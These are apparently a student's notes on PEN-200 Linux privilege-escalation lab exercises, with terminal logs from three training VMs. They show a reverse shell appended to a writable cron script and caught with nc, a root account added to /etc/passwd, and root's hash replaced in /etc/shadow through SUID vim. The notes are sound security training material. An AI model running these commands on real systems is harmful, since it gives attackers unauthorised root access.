---
id: offsec labs
tags: [offsec, labs]
created: 2023-01-27
---
# offsec labs

backlinks: [[snippets-bash]]

sources:

---

## PEN-200: 18.3.5 Linux Privilege escalation


 Exercises

(To be performed on your Debian lab client machines - Reporting is required for these exercises)

    Log in to your Debian client with your student credentials and attempt to elevate your privileges by adding a superuser account to the /etc/passwd file.

(To be performed with the Topic Exercises VMs under "Resources" - Reporting is not required for these exercises)

    On the target VM #1, use an appropriate privilege escalation technique to gain access to root and read the flag. Scheduling is all that matters.

```
echo "Finding writable files" && find / -writable -type f 2>/dev/null



└─$ ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 18.3.5.2.vm1.script 
The authenticity of host '[192.168.125.52]:2222 ([192.168.125.52]:2222)' can't be established.
ED25519 key fingerprint is SHA256:B0J0flfJ43NpUkFeZpWEqdxJ2CHcvg2tS02m+kv81Sw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.125.52]:2222' (ED25519) to the list of known hosts.
Welcome to the PEN-200 Kali Linux Shell.
student@192.168.125.52's password: 
┌──(student㉿052593dacd54)-[~]
└─$ find / -writable -type d 2>/dev/null                                                                                                                                                    
/var/tmp
/run/lock
/run/screen
/tmp
/dev/shm
/dev/mqueue
/proc/36/task/36/fd
/proc/36/fd
/proc/36/map_files
/home/student
┌──(student㉿052593dacd54)-[~]
└─$ echo "Finding writable files/n" && find / -writable -type d 2>/dev/null                                                                                                                 
Finding writable files/n
/var/tmp
/run/lock
/run/screen
/tmp
/dev/shm
/dev/mqueue
/proc/42/task/42/fd
/proc/42/fd
/proc/42/map_files
/home/student
┌──(student㉿052593dacd54)-[~]
└─$ echo "Finding writable files" && find / -writable -type f 2>/dev/null                                                                                                                   
Finding writable files
/var/archives/archive.sh
/proc/keys
/proc/kcore
/proc/timer_list
/proc/sched_debug
/proc/1/task/1/attr/current
/proc/1/task/1/attr/exec
/proc/1/task/1/attr/fscreate
/proc/1/task/1/attr/keycreate
/proc/1/task/1/attr/sockcreate
/proc/1/task/1/attr/display
/proc/1/task/1/attr/smack/current
/proc/1/task/1/attr/apparmor/current
/proc/1/task/1/attr/apparmor/exec
/proc/1/attr/current
/proc/1/attr/exec
/proc/1/attr/fscreate
/proc/1/attr/keycreate
/proc/1/attr/sockcreate
/proc/1/attr/display
/proc/1/attr/smack/current
/proc/1/attr/apparmor/current
/proc/1/attr/apparmor/exec
/proc/1/timerslack_ns
/proc/12/task/12/attr/current
/proc/12/task/12/attr/exec
/proc/12/task/12/attr/fscreate
/proc/12/task/12/attr/keycreate
/proc/12/task/12/attr/sockcreate
/proc/12/task/12/attr/display
/proc/12/task/12/attr/smack/current
/proc/12/task/12/attr/apparmor/current
/proc/12/task/12/attr/apparmor/exec
/proc/12/attr/current
/proc/12/attr/exec
/proc/12/attr/fscreate
/proc/12/attr/keycreate
/proc/12/attr/sockcreate
/proc/12/attr/display
/proc/12/attr/smack/current
/proc/12/attr/apparmor/current
/proc/12/attr/apparmor/exec
/proc/12/timerslack_ns
/proc/14/task/14/attr/current
/proc/14/task/14/attr/exec
/proc/14/task/14/attr/fscreate
/proc/14/task/14/attr/keycreate
/proc/14/task/14/attr/sockcreate
/proc/14/task/14/attr/display
/proc/14/task/14/attr/smack/current
/proc/14/task/14/attr/apparmor/current
/proc/14/task/14/attr/apparmor/exec
/proc/14/attr/current
/proc/14/attr/exec
/proc/14/attr/fscreate
/proc/14/attr/keycreate
/proc/14/attr/sockcreate
/proc/14/attr/display
/proc/14/attr/smack/current
/proc/14/attr/apparmor/current
/proc/14/attr/apparmor/exec
/proc/14/timerslack_ns
/proc/15/task/15/attr/current
/proc/15/task/15/attr/exec
/proc/15/task/15/attr/fscreate
/proc/15/task/15/attr/keycreate
/proc/15/task/15/attr/sockcreate
/proc/15/task/15/attr/display
/proc/15/task/15/attr/smack/current
/proc/15/task/15/attr/apparmor/current
/proc/15/task/15/attr/apparmor/exec
/proc/15/attr/current
/proc/15/attr/exec
/proc/15/attr/fscreate
/proc/15/attr/keycreate
/proc/15/attr/sockcreate
/proc/15/attr/display
/proc/15/attr/smack/current
/proc/15/attr/apparmor/current
/proc/15/attr/apparmor/exec
/proc/15/timerslack_ns
/proc/16/task/16/attr/current
/proc/16/task/16/attr/exec
/proc/16/task/16/attr/fscreate
/proc/16/task/16/attr/keycreate
/proc/16/task/16/attr/sockcreate
/proc/16/task/16/attr/display
/proc/16/task/16/attr/smack/current
/proc/16/task/16/attr/apparmor/current
/proc/16/task/16/attr/apparmor/exec
/proc/16/attr/current
/proc/16/attr/exec
/proc/16/attr/fscreate
/proc/16/attr/keycreate
/proc/16/attr/sockcreate
/proc/16/attr/display
/proc/16/attr/smack/current
/proc/16/attr/apparmor/current
/proc/16/attr/apparmor/exec
/proc/16/timerslack_ns
/proc/18/task/18/attr/current
/proc/18/task/18/attr/exec
/proc/18/task/18/attr/fscreate
/proc/18/task/18/attr/keycreate
/proc/18/task/18/attr/sockcreate
/proc/18/task/18/attr/display
/proc/18/task/18/attr/smack/current
/proc/18/task/18/attr/apparmor/current
/proc/18/task/18/attr/apparmor/exec
/proc/18/attr/current
/proc/18/attr/exec
/proc/18/attr/fscreate
/proc/18/attr/keycreate
/proc/18/attr/sockcreate
/proc/18/attr/display
/proc/18/attr/smack/current
/proc/18/attr/apparmor/current
/proc/18/attr/apparmor/exec
/proc/18/timerslack_ns
/proc/19/task/19/sched
/proc/19/task/19/comm
/proc/19/task/19/mem
/proc/19/task/19/clear_refs
/proc/19/task/19/attr/current
/proc/19/task/19/attr/exec
/proc/19/task/19/attr/fscreate
/proc/19/task/19/attr/keycreate
/proc/19/task/19/attr/sockcreate
/proc/19/task/19/attr/display
/proc/19/task/19/attr/smack/current
/proc/19/task/19/attr/apparmor/current
/proc/19/task/19/attr/apparmor/exec
/proc/19/task/19/oom_adj
/proc/19/task/19/oom_score_adj
/proc/19/task/19/loginuid
/proc/19/task/19/uid_map
/proc/19/task/19/gid_map
/proc/19/task/19/projid_map
/proc/19/task/19/setgroups
/proc/19/sched
/proc/19/autogroup
/proc/19/timens_offsets
/proc/19/comm
/proc/19/mem
/proc/19/clear_refs
/proc/19/attr/current
/proc/19/attr/exec
/proc/19/attr/fscreate
/proc/19/attr/keycreate
/proc/19/attr/sockcreate
/proc/19/attr/display
/proc/19/attr/smack/current
/proc/19/attr/apparmor/current
/proc/19/attr/apparmor/exec
/proc/19/oom_adj
/proc/19/oom_score_adj
/proc/19/loginuid
/proc/19/coredump_filter
/proc/19/uid_map
/proc/19/gid_map
/proc/19/projid_map
/proc/19/setgroups
/proc/19/timerslack_ns
/proc/43/task/43/sched
/proc/43/task/43/comm
/proc/43/task/43/mem
/proc/43/task/43/clear_refs
/proc/43/task/43/attr/current
/proc/43/task/43/attr/exec
/proc/43/task/43/attr/fscreate
/proc/43/task/43/attr/keycreate
/proc/43/task/43/attr/sockcreate
/proc/43/task/43/attr/display
/proc/43/task/43/attr/smack/current
/proc/43/task/43/attr/apparmor/current
/proc/43/task/43/attr/apparmor/exec
/proc/43/task/43/oom_adj
/proc/43/task/43/oom_score_adj
/proc/43/task/43/loginuid
/proc/43/task/43/uid_map
/proc/43/task/43/gid_map
/proc/43/task/43/projid_map
/proc/43/task/43/setgroups
/proc/43/sched
/proc/43/autogroup
/proc/43/timens_offsets
/proc/43/comm
/proc/43/mem
/proc/43/clear_refs
/proc/43/attr/current
/proc/43/attr/exec
/proc/43/attr/fscreate
/proc/43/attr/keycreate
/proc/43/attr/sockcreate
/proc/43/attr/display
/proc/43/attr/smack/current
/proc/43/attr/apparmor/current
/proc/43/attr/apparmor/exec
/proc/43/oom_adj
/proc/43/oom_score_adj
/proc/43/loginuid
/proc/43/coredump_filter
/proc/43/uid_map
/proc/43/gid_map
/proc/43/projid_map
/proc/43/setgroups
/proc/43/timerslack_ns
/home/student/.bashrc.original
/home/student/.bash_logout
/home/student/.zshrc
/home/student/.profile
/home/student/.bashrc
┌──(student㉿052593dacd54)-[~]
└─$ cat /var/archives/archive.sh
#!/bin/bash

TIMESTAMP=$(date +"%T")
echo "$TIMESTAMP running the archiver"
#cp -rf /home/kali/ /var/backups/kali/
cp -rf /home/student/ /var/backups/student/
┌──(student㉿052593dacd54)-[~]
└─$ ^C                                                                                                                                                                                      
┌──(student㉿052593dacd54)-[~]
└─$ echo "bash -i >& /dev/tcp/192.168.119.125/4444 0>&1" >> /var/archives/archive.sh                                                                                                        
┌──(student㉿052593dacd54)-[~]
└─$ cat /var/archives/archive.sh                                                                                                        
#!/bin/bash

TIMESTAMP=$(date +"%T")
echo "$TIMESTAMP running the archiver"
#cp -rf /home/kali/ /var/backups/kali/
cp -rf /home/student/ /var/backups/student/
bash -i >& /dev/tcp/192.168.119.125/4444 0>&1
┌──(student㉿052593dacd54)-[~]












Finding writable files
/var/archives/archive.sh


echo "bash -i >& /dev/tcp/192.168.119.125/4444 0>&1" >> /var/archives/archive.sh

#setup listener and wait



└─$ nc -l -p 4444
bash: cannot set terminal process group (111): Inappropriate ioctl for device
bash: no job control in this shell
root@052593dacd54:~# cd /root.
cd /root.
bash: cd: /root.: No such file or directory
root@052593dacd54:~# cd /root
cd /root
root@052593dacd54:~# ls
ls
flag.txt
root@052593dacd54:~# cat flag.txt
cat flag.txt
OS{46e7158c128f6652f88651dde753354c}
root@052593dacd54:~# 






```

    On the target VM #2, use another appropriate privilege escalation technique to gain access to root and read the flag. Take a closer look at file permissions.

```

─$ ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 18.3.5.2.vm2.script
The authenticity of host '[192.168.125.52]:2222 ([192.168.125.52]:2222)' can't be established.
ED25519 key fingerprint is SHA256:B0J0flfJ43NpUkFeZpWEqdxJ2CHcvg2tS02m+kv81Sw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.125.52]:2222' (ED25519) to the list of known hosts.
Welcome to the PEN-200 Kali Linux Shell.
student@192.168.125.52's password: 
Last login: Tue Mar  7 19:23:18 2023 from 192.168.119.125
┌──(student㉿0aa787f04e9f)-[~]
└─$ openssl passwd evil                                                                                                                                                                     
jecJ1Q9dMshvU
┌──(student㉿0aa787f04e9f)-[~]
└─$ echo "root3:jecJ1Q9dMshvU:0:0:root:/root:/bin/bash" >> /etc/passwd                                                                                                                      
┌──(student㉿0aa787f04e9f)-[~]
└─$ su root3
Password: 
┌──(root💀0aa787f04e9f)-[/home/student]
└─# cd /
┌──(root💀0aa787f04e9f)-[/]
└─# ls -la                                                                                                                                                                                  
total 72
drwxr-xr-x   1 root root 4096 Mar  7 19:22 .
drwxr-xr-x   1 root root 4096 Mar  7 19:22 ..
-rwxr-xr-x   1 root root    0 Mar  7 19:22 .dockerenv
lrwxrwxrwx   1 root root    7 Nov  7  2020 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Nov  4  2020 boot
drwxr-xr-x   5 root root  340 Mar  7 19:22 dev
drwxr-xr-x   1 root root 4096 Mar  7 19:22 etc
drwxr-xr-x   1 root root 4096 Mar  7 19:22 home
lrwxrwxrwx   1 root root    7 Nov  7  2020 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Nov  7  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Nov  7  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Nov  7  2020 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Nov  7  2020 media
drwxr-xr-x   2 root root 4096 Nov  7  2020 mnt
drwxr-xr-x   2 root root 4096 Nov  7  2020 opt
dr-xr-xr-x 229 root root    0 Mar  7 19:22 proc
drwx------   1 root root 4096 Mar  7 19:22 root
drwxr-xr-x   1 root root 4096 Mar  7 19:22 run
lrwxrwxrwx   1 root root    8 Nov  7  2020 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Nov  7  2020 srv
dr-xr-xr-x  13 root root    0 Mar  7 19:22 sys
drwxrwxrwt   1 root root 4096 Nov 12  2020 tmp
drwxr-xr-x   1 root root 4096 Nov  7  2020 usr
drwxr-xr-x   1 root root 4096 Nov  7  2020 var
┌──(root💀0aa787f04e9f)-[/]
└─# cd root                                                                                                                                                                                 
┌──(root💀0aa787f04e9f)-[~]
└─# ls                                                                                                                                                                                      
flag.txt
┌──(root💀0aa787f04e9f)-[~]
└─# cat flag.txt                                                                                                                                                                            
OS{484156a1bb2761f1ed0f9bac112e30d8}
┌──(root💀0aa787f04e9f)-[~]
└─#                                                                       

```

    Again, use an appropriate privilege escalation technique to gain access to root and read the flag on the target VM #3. Binary flags and custom shell are what to look for.

```

evilroot:evil
└─$ echo "evilroot:.3z9awbcywg0A:0:0:root:/root:/bin/bash" >> source/passwd         


student@0e5eb1618f86:~$ find / -type f -perm -4001 -exec ls -h {} \; 2> /dev/null
/bin/umount
/bin/su
/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/find
/usr/bin/chfn
/usr/bin/gawk
/usr/bin/vim.basic
/usr/lib/openssh/ssh-keysign

student@0e5eb1618f86:~$ vim.basic /etc/shadow
replace first * which is the password with the openssl passwd evil

root:*:18900:0:99999:7:::
with
root:.3z9awbcywg0A:18900:0:99999:7:::


student@0e5eb1618f86:~$ su root
Password:     evil      from openssl passwd evil
root@0e5eb1618f86:/home/student# cd /root
root@0e5eb1618f86:~# ls
flag.txt
root@0e5eb1618f86:~# cat flag.txt
Great job! You found me.
Here is your flag:

OS{4cbfd3f87250b6c4f820e2348af92bee}


```

(c) 2023 OffSec Services Limited. All Rights Reserved.
